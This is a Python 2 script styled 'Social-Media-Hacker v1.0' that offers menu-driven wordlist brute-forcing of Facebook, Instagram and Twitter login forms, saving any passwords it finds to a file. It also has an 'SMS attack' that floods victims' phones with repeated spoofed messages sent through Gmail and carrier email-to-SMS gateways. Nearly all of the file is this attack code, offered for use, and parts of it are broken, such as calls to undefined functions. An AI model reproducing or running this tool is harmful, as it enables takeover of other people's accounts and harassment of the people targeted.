#!/usr/bin/env python
import requests
import random
import json
import math
import getpass
import sys
import smtplib
import mechanize
import os
import urllib
import uuid
import copy
import calendar
import hashlib
import hmac
import cookielib
import time
from time import sleep
from getpass import getpass
from subprocess import call
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan  
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
if sys.version_info.major == 3:
    import urllib.parse

def useragent():
  useragents = [
           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
  return random.choice(useragents)

def menuit():
    print ''' (Do you wish to go to the menu or quit program?)'''
    print '(m = menu, q = quit)'
    menuit = raw_input(':')
    menuit = menuit.lower()
    if menuit == 'm':
        main()
    if menuit == 'q':
        quit()
    else:
        print('Please type in m or q')
        were = raw_input('Press Enter to Continue...')
        os.system('clear')
        menuit()
def msms():
    os.system('clear')
    print ""+G+" "
    print """
        [°] Mass List SMS Attack______ 
        When creating the file list, remember to attack the carrier to the end of each number.
        [+] example. 4567834214@txt.att.net[+]
        here is a list of the different carrier types.
        You can look them up also at online if theres a new one.
        "AT&T: @txt.att.net"
        "Qwest: @tmomail.net"
        "T-Mobile: @tmomail.net"
        "Verizon: @vtext.com"
        "Sprint: @messaging.sprintpcs.com or @pm.sprint.com"
        "Virgin Mobile: @vmobl.com "
        "Nextel: @messaging.nextel.com"
        "Alltel: @message.alltel.com"
        "Metro PCS: @mymetropcs.com"
        "Powertel: @ptel.com"
        "Boost Mobile: @myboostmobile.com"
        "Suncom: @tms.suncom.com"
        "tracfone: @mmst5.tracfone.com"
        "U.S Cellular: @email.uscc.net"
        "Put the @ sign before the provider"
        """
    print ""+T+" "
    phonelst = raw_input(color.UNDERLINE + 'Path to Victem list' + color.END)
    phonelst = open(phonelst, 'rb')
    print ""+T+" "
    gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
    print ""+T+" "
    fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
    print ""+T+" "
    password = getpass(color.UNDERLINE + 'Password>' + color.END)
    o = smtplib.SMTP("smtp.gmail.com:587")
    o.starttls()
    o.login(gmail, password)
    message = raw_input(color.UNDERLINE + 'Message>' + color.END)
    print ""+T+" "
    counter = input(color.UNDERLINE + 'How many times>' + color.END)
    print ""+T+" "
    for phone in phonelst:
        try:
            spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone, message)
            print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
            for i in range(counter):
                o.sendmail(fromname, phone, spam_msg)
            sleep(0.004)
            print(phone)
            print (color.UNDERLINE + ''+G+'[*] Successfully sent' + color.END), counter ,(color.UNDERLINE + ''+G+'[*] messages!' + color.END)
        except:
            
            print("Sorry you typed something wrong. Please review the info you typed")
            print("your info is right here:", " ", gmail, " ", password, " ", spam_msg)
            b = raw_input("Press Enter to Continue")	
            msms()


def ssms():
    os.system('clear')
    print ""+B+""
    print ("""
        [°]Single SMS Attack-------------------------[√]
        "AT&T: @txt.att.net"
        "Qwest: @tmomail.net"
        "T-Mobile: @tmomail.net"
        "Verizon: @vtext.com"
        "Sprint: @messaging.sprintpcs.com or @pm.sprint.com"
        "Virgin Mobile: @vmobl.com "
        "Nextel: @messaging.nextel.com"
        "Alltel: @message.alltel.com"
        "Metro PCS: @mymetropcs.com"
        "Powertel: @ptel.com"
        "Boost Mobile: @myboostmobile.com"
        "Suncom: @tms.suncom.com"
        "tracfone: @mmst5.tracfone.com"
        "U.S Cellular: @email.uscc.net"
        "Put the @ sign before the provider"
        """)
    provider = raw_input(color.UNDERLINE + 'Enter cellular provider>' + color.END)
    print ""+T+" "
    phone_num = raw_input(color.UNDERLINE + 'Victims phone number>' + color.END) + provider
    print ""+T+" "
    gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
    print ""+T+" "
    password = getpass(color.UNDERLINE + 'Password>' + color.END)
    fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
    print ("This function should make your message anonymous, unless google fixes the this flaw")

    o = smtplib.SMTP("smtp.gmail.com:587")
    o.starttls()
    o.login(gmail, password)
    print ""+T+" "
    message = raw_input(color.UNDERLINE + 'Message>' + color.END)
    print ""+T+" "
    counter = input(color.UNDERLINE + 'How many times>' + color.END)
    print ""+T+" "
    spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone_num, message)
    print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
    for i in range(counter):
        o.sendmail(gmail, phone_num, spam_msg)
    sleep(0.004)
    print(phone_num)
    print (color.UNDERLINE + ''+G+'[*] Successfully sent ' + str(counter) + ' Messages!' + color.END)


def smsatt():
    os.system('clear')
    print ""+O+" "
    print """
                []==============================[]
                []::::::::Sms Attacker::::::::::[]
                []==============================[]

                [√]========================================[°]
                    ReCoded By: DevilanD
                [√]========================================[°]"""
    print ""+P+" "
    print """
               [÷]_____________________________________________[÷]
                  this sms attack will send spam anonomoously
                  (whatever you choose) to target as many times
                   you type in.
                [×]_____________________________________________[×]
                    options: s=single target m=mass email list
                 []_____________________________________________[]"""
    print ""+C+" "
    option = raw_input('option:')
    option = option.lower()
    if option == 's':
        os.system('clear')
        ssms()
    elif option == 'm':
        os.system('clear')

    else:
        os.system('clear')
        print ""+R+" "
        print "Sorry Just Type s or m only"
        p = raw_input('Press enter to continue...')
        smsatt()

        
def twitter():
    ulis = '//mobile.twitter.com/home'
    attempt = 0
    site = 'Twitter'
    print ""+P+" "
    e = os.system('clear')
    e
    dil = '''
    [√] Instagram-Cracker______
    '''
    url = 'https://m.twitter.com/login/'
    dil
    print '''
    Username or phone number/email?
    p = Phone, u = username
    '''
    pu = raw_input("option:").lower()
    if pu == 'u':
        username = raw_input('Username:')
        ulio = requests.get('https://www.mobile.twitter.com/' + username)
        if ulio.status_code == 200:
                os.system('clear')
                print "Username Exists!"
        else:
                print("That doesn't Exist!")
                sleep(3)
                os.system('clear')
                instagram()
    elif pu == 'p':
        username = raw_input(color.BLUE + 'Phone_Number/Email:')
    else:
        print 'not an option'
        sleep(3)
        e
        instagram()	
            
    wordliste = raw_input(color.YELLOW + 'PATH to wordlist:' + color.GREEN)
    try:
        wordlister = open(wordliste, 'r')
    except:
        print "list isn't found"
        sleep(3)
        os.system('clear')
        facebook()
    print("Default is 4")
    timmir = int(raw_input(color.YELLOW + "delay time between guesses:" + color.GREEN) or 4)
    os.system('clear')
    print 'Do you want to save the output to a file?'
    deltaco = raw_input(':')
    os.system('clear')
    fil = raw_input(color.YELLOW + 'PATH to output file:' + color.GREEN)
    try:
        fil = open(fil, 'a')
    except:
        os.system('clear')
        print "That doesn't exist"
    deltaco = deltaco.lower()
    wordlist = list(wordlister)
    rec = wordlist.remove('\n')
    rec
    for password in wordlist:
            try:
                attempt=attempt+1
                password = password.strip()
                t = mechanize.Browser()
                t.set_handle_equiv(True)
                t.set_handle_referer(True)
                t.set_handle_robots(False)
                t.addheaders = [('User-Agent', useragent)]
                response = t.open(url)
                t.form = list(t.forms())[0]
                t.form['session[username_or_email]'] = username
                t.form['session[password]'] = password
                t.method = 'POST'
                response = t.submit()
                if response.geturl() == 'https://www.twitter.com/':
                    os.system('clear')
                    print ""+P+" "
                    print
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker____________ [-]'
                    print'[-]============================[-]'
                    print'[-]____________________________[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------------')
                    print('Password Found!')
                    print(color.GREEN + site + ' Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                    fil.write('\n' + site + '|'+ 'Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                    print "File Saved!"
                    menuit()
                    if deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                                    
                elif response.geturl() == 'https://www.twitter.com/mobileprotection?source=mobile_mirror_nux':
                    os.system('clear')
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker1___________ [-]'
                    print'[-]============================[-]'
                    print'[-]____________________________[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------')
                    print('Password Found!')
                    print(color.GREEN + site + '|' + ' Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                elif response.geturl() == ulis:
                    os.system('clear')
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker____________ [-]'
                    print'[-]============================[-]'
                    print'[-]____________________________[-]'
                    print('°Username:%s' % username)
                    print('°Wordlist:%s' % wordliste)
                    print('°password:%s' % password)
                    print('°Attempt:%s' % attempt)
                    print('------------------------------')
                    print("Challenge Required/ or layman's terms| they have a notification of password incursion")
                    print('Password Found!')
                    print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                                
                elif response.geturl() == 'https://www.twitter.com/?sk=welcome':
                    os.system('clear')
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker____________ [-]'
                    print'[-]============================[-]'
                    print'[-]___________________________=[-]'
                    print('°Username:%s' % username)
                    print('°Wordlist:%s' % wordliste)
                    print('°password:%s' % password)
                    print('°Attempt:%s' % attempt)
                    print('------------------------------')
                    print('Password Found!')
                    print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                
                elif response.geturl() == 'https://www.twitter.com/challenge/2337953697/jtXc04VfD9/':
                    os.system('clear')
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker_____________[-]'
                    print'[-]============================[-]'
                    print'[-]++++++++++++++++++++++++++++[-]'
                    print('•Username:%s' % username)
                    print('•Wordlist:%s' % wordliste)
                    print('•password:%s' % password)
                    print('•Attempt:%s' % attempt)
                    print('------------------------------')
                    print("Challenge Required/ or layman's terms| they have a notification of password incursion")
                    print('Password Found!')
                    print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                else:
                    os.system('clear')
                    print ""+P+" "
                    print'[-]==============================[-]'
                    print'[-]Twitter-Cracker______________ [-]'
                    print'[-]==============================[-]'
                    print response.geturl()
                    print'[-]______________________________[-]'
                    print('•Username:%s' % username)
                    print('•Wordlist:%s' % wordliste)
                    print('•password:%s' % password)
                    print('•Attempt:%s' % attempt)
                    print('------------------------------------')
                    print('Password:%s Does not work!' % password)
                    sleep(timmir)
                    os.system('clear')
                        
            except KeyboardInterrupt:kill()




        
    

def instagram():
    attempt = 0
    site = 'Instagram'
    print ""+R+" "
    e = os.system('clear')
    e
    dil = '''
    [√] Instagram-Cracker______________[×]
    '''
    url = 'https://www.instagram.com/accounts/login/?force_classic_login'
    dil
    print '''
    Username or phone number/email?
    p = Phone, u = username
    '''
    pu = raw_input("option:").lower()
    if pu == 'u':
            username = raw_input('Username:')
            ulio = requests.get('https://www.instagram.com/' + username)
            if ulio.status_code == 200:
                    os.system('clear')
                    print "Username Exists!"
            else:
                    print("That doesn't Exist!")
                    sleep(3)
                    os.system('clear')
                    instagram()
    elif pu == 'p':
            username = raw_input(color.BLUE + 'Phone_Number/Email:')
    else:
            print 'not an option'
            sleep(3)
            e
            instagram()	
            
    wordliste = raw_input(color.YELLOW + 'PATH to wordlist:' + color.GREEN)
    try:
            wordlister = open(wordliste, 'r')
    except:
            print "list isn't found"
            sleep(3)
            e
            facebook()
    print("Default is 4")
    timmir = int(raw_input(color.YELLOW + "delay time between guesses:" + color.GREEN) or 4)
    os.system('clear')
    print 'Do you want to save the output to a file?'
    deltaco = raw_input(':')
    os.system('clear')
    fil = raw_input(color.YELLOW + 'PATH to output file:' + color.GREEN)
    try:
            fil = open(fil, 'a')
    except:
            os.system('clear')
            print "That doesn't exist"
    deltaco = deltaco.lower()
    wordlist = list(wordlister)
    rec = wordlist.remove('\n')
    rec
    rec
    for password in wordlist:
            try:
                    attempt=attempt+1
                    password = password.strip()
                    i = mechanize.Browser()
                    i.set_handle_equiv(True)
                    i.set_handle_referer(True)
                    i.set_handle_robots(False)
                    i.addheaders = [('User-Agent', useragent)]
                    response = i.open(url)
                    i.form = list(i.forms())[0]
                    i.form['username'] = username
                    i.form['password'] = password
                    i.method = 'POST'
                    response = i.submit()
                    if response.geturl() == 'https://www.instagram.com/':
                            os.system('clear')
                            print ""+O+" "
                            print
                            print'[-]==============================[-]'
                            print'[-]Instagram-Cracker____________ [-]'
                            print'[-]==============================[-]'
                            print'[-]______________________________[-]'
                            print('•Username:%s' % username)
                            print('•Wordlist:%s' % wordliste)
                            print('•password:%s' % password)
                            print('•Attempt:%s' % attempt)
                            print('------------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + ' Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|'+ 'Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            if deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                                    
                    elif response.geturl() == 'https://www.instagram.com/mobileprotection?source=mobile_mirror_nux':
                            os.system('clear')
                            print ""+O+" "
                            print'[-]==============================[-]'
                            print'[-]Instagram-Cracker_____________[-]'
                            print'[-]==============================[-]'
                            print'[-]______________________________[-]'

                            print('√Username:%s' % username)
                            print('√Wordlist:%s' % wordliste)
                            print('√password:%s' % password)
                            print('√Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + '|' + ' Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    elif response.geturl() == 'https://www.instagram.com/?sk=welcome':
                            os.system('clear')
                            print ""+O+" "
                            print'[-]==============================[-]'
                            print'[-]Instagram-Cracker_____________[-]'
                            print'[-]==============================[-]'
                            print'[-]______________________________[-]'

                            print('√Username:%s' % username)
                            print('√Wordlist:%s' % wordliste)
                            print('√password:%s' % password)
                            print('√Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    
                    elif response.geturl() == 'https://www.instagram.com/challenge/2337953697/jtXc04VfD9/':
                            os.system('clear')
                            print ""+O+" "
                            print'[-]==============================[-]'
                            print'[-]Instagram____________________ [-]'
                            print'[-]==============================[-]'
                            print'[-]______________________________[-]'

                            print('•Username:%s' % username)
                            print('•Wordlist:%s' % wordliste)
                            print('•password:%s' % password)
                            print('•Attempt:%s' % attempt)
                            print('------------------------------')
                            print("Challenge Required/ or layman's terms| they have a notification of password incursion")
                            print('Password Found!')
                            print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    else:
                            os.system('clear')
                            print ""+O+" "
                            print'[-]==============================[-]'
                            print'[-]Instagram-Cracker_____________[-]'
                            print'[-]==============================[-]'
                            print response.geturl()
                            print'[-]______________________________[-]'
                            print('√Username:%s' % username)
                            print('√Wordlist:%s' % wordliste)
                            print('√password:%s' % password)
                            print('√Attempt:%s' % attempt)
                            print('------------------------------------')
                            print('Password:%s Does not matching!' % password)
                            sleep(timmir)
                            os.system('clear')
                            
            except KeyboardInterrupt:kill()	

def facebook():
    site = 'Facebook'
    attempt=0
    e = os.system('clear')
    print ""+G+" "
    d = '''
    [•] Facebook-Cracker_______________________[•]
    '''
    url = 'https://www.facebook.com/login.php'
    d
    print '''
    Username or Phone number/email?
    p = phone, u = username
    '''
    pu = raw_input("option:").lower()
    if pu == 'u':
            username = raw_input('Username:')
            ulio = requests.get('https://www.facebook.com/' + username)
            if ulio.status_code == 200:
                    e
                    print "Username Exists!"
            else:
                    print("That doesn't Exist!")
                    sleep(3)
                    e
                    facebook()
                    
    elif pu == 'p':
            username = raw_input(color.BLUE + 'Phone_Number/Email:')
    else:
            print 'not an option'
            sleep(3)
            os.system('clear')
            facebook()
    wordliste = raw_input(color.YELLOW + 'PATH to wordlist:' + color.GREEN)
    try:
            wordlister = open(wordliste, 'r')
    except:
            print "list isn't found"
            sleep(3)
            os.system('clear')
            facebook()
    print("Default is 4")
    timmir = int(raw_input(color.YELLOW + "delay time between guesses:" + color.GREEN) or 4)
    os.system('clear')
    print 'Do you want to save the output to a file?'
    deltaco = raw_input(':')
    os.system('clear')
    fil = raw_input(color.YELLOW + 'PATH to output file:' + color.GREEN)
    try:
            fil = open(fil, 'a')
    except:
            os.system('clear')
            print "That doesn't exist"
    deltaco = deltaco.lower()
    wordlist = list(wordlister)
    for password in wordlist:
            try:
                    attempt=attempt+1
                    password = password.strip()
                    f = mechanize.Browser()
                    f.set_handle_equiv(True)
                    f.set_handle_referer(True)
                    f.set_handle_robots(False)
                    f.addheaders = [('User-Agent', useragent)]
                    response = f.open(url)
                    f.form = list(f.forms())[0]
                    f.form['email'] = username
                    f.form['pass'] = password
                    f.method = 'POST'
                    response = f.submit()
                    if response.geturl() == 'https://www.facebook.com/':
                            print ""+B+" "
                            print
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker____________ [-]'
                            print'[-]=============================[-]'
                            print'[-]_____________________________[-]'
                            print('{Username:%s' % username)
                            print('{Wordlist:%s' % wordlist)
                            print('{password:%s' % password)
                            print('{Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + 'Username:' + username + 'Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|'+ 'Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                                    print "File saved!"
                                    menuit()
                            if deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                                    
                    elif response.geturl() == 'https://www.facebook.com/checkpoint/?next':
                            print ""+B+" "
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker____________ [-]'
                            print'[-]=============================[-]'
                            print'[-]_____________________________[-]'

                            print('•Username:%s' % username)
                            print('•Wordlist:%s' % wordliste)
                            print('•password:%s' % password)
                            print('•Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    elif response.geturl() == 'https://www.facebook.com/?sk=welcome':
                            print ""+B+" "
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker___________= [-]'
                            print'[-]=============================[-]'
                            print'[-]_____________________________[-]'

                            print('•Username:%s' % username)
                            print('•Wordlist:%s' % wordliste)
                            print('•password:%s' % password)
                            print('•Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password Found!')
                            print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                            if deltaco == 'yes':
                                    attempt = str(attempt)
                                    fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                                    print "File Saved!"
                                    menuit()
                            elif deltaco == 'no':
                                    pass
                            else:
                                    print "nope, that doesn't work"
                                    quit()
                    else:
                            print ""+B+" "
                            print'[-]=============================[-]'
                            print'[-]Facebook-Cracker_____________[-]'
                            print'[-]=============================[-]'
                            print response.geturl()
                            print'[-]_____________________________[-]'
                            print('•Username:%s' % username)
                            print('•Wordlist:%s' % wordliste)
                            print('•password:%s' % password)
                            print('•Attempt:%s' % attempt)
                            print('------------------------------')
                            print('Password:%s Does not work!' % password)
                            sleep(timmir)
                            os.system('clear')
                            
            except KeyboardInterrupt:kill()

 
def main():
    print ""+T+" "
    e = os.system('clear')
    print'''
    [+]======================[+]
    [+ Social-Media-Hacker v1.0]
    [+]======================[+]
    [-]ReCoded by: DevilanD  [-]
    [+]======================[+]
    [=]______________________[=]
    [1]Facebook
    [2]instagram
    [3]Twitter
    [4]Snapchat
    [5]SMS attack
    [6]Undetermined
    [7]undetermined
    '''
    Axom = input('option:')
    e

    if Axom == 1:
            e
            facebook()
    elif Axom == 2:
            e
            instagram()
    elif Axom == 3:
            e
            twitter()
    elif Axom == 4:
            e
            snapchat()
    elif Axom == 5:
            smsatt()
    else:
            e
            print("sorry, that's not an option")
            d = raw_input("Press enter to continue...")
            e
            main()
        
main()			

    


    
    
